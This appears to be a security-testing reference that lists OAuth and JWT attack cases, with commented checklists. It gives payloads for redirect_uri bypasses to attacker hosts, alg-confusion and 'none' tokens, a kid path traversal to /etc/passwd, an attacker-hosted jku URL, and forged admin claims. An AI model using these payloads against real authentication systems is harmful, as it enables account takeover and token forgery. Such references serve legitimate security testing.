<oauth_attacks>
<redirect_uri_manipulation>
{% raw %}
# Test redirect_uri validation strictness
# Open redirect scenarios

# Path traversal
redirect_uri=https://example.com/callback/../attacker

# Subdomain bypass
redirect_uri=https://attacker.example.com/callback

# Parser differential
redirect_uri=https://example.com@attacker.com
redirect_uri=https://example.com%40attacker.com
redirect_uri=https://example.com.attacker.com

# Fragment bypass
redirect_uri=https://example.com/callback#.attacker.com

# Unicode/encoding bypass
redirect_uri=https://example.com/callback%2F..%2Fattacker
{% endraw %}
</redirect_uri_manipulation>

<authorization_code_attacks>
{% raw %}
# Authorization code interception
# Test if code is exposed in:
# - URL fragments
# - Referrer headers
# - Browser history
# - Server logs

# Code reuse test
# Can the same authorization code be used multiple times?

# Cross-client code usage
# Can a code issued for client_A be used by client_B?

# PKCE bypass
# Does the server accept requests without code_verifier?
# Does it accept any code_verifier?
{% endraw %}
</authorization_code_attacks>

<state_nonce_attacks>
{% raw %}
# Missing state parameter
# CSRF attack if state not required

GET /authorize?
  client_id=xxx
  &response_type=code
  &redirect_uri=https://app.com/callback
  # Note: no state parameter

# State fixation
# Can attacker pre-set state value?

# Nonce validation bypass
# Is nonce properly validated in ID tokens?
{% endraw %}
</state_nonce_attacks>

<implicit_flow_attacks>
{% raw %}
# Token in URL fragment - history/referrer leak
response_type=token
response_type=id_token token

# Access token exposure via:
# - JavaScript access to location.hash
# - Referrer header leakage
# - Browser history
{% endraw %}
</implicit_flow_attacks>
</oauth_attacks>

<token_attacks>
<jwt_vulnerabilities>
{% raw %}
# Algorithm confusion attack
# Change RS256 to HS256, use public key as secret
{
  "alg": "HS256",
  "typ": "JWT"
}

# None algorithm attack
{
  "alg": "none",
  "typ": "JWT"
}

# Key ID injection
{
  "alg": "RS256",
  "kid": "../../etc/passwd",
  "typ": "JWT"
}

# JKU/X5U header injection
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "typ": "JWT"
}
{% endraw %}
</jwt_vulnerabilities>

<claim_manipulation>
{% raw %}
# Claim injection/modification
# Check if these claims are properly validated:
{
  "sub": "auth0|attacker_user_id",
  "email": "admin@company.com",
  "email_verified": true,
  "roles": ["admin"],
  "permissions": ["read:all", "write:all"],
  "app_metadata": {"role": "admin"},
  "aud": ["https://target-api.com"],
  "scope": "openid profile email admin"
}

# Test claim precedence
# Do app_metadata claims override user claims?
{% endraw %}
</claim_manipulation>

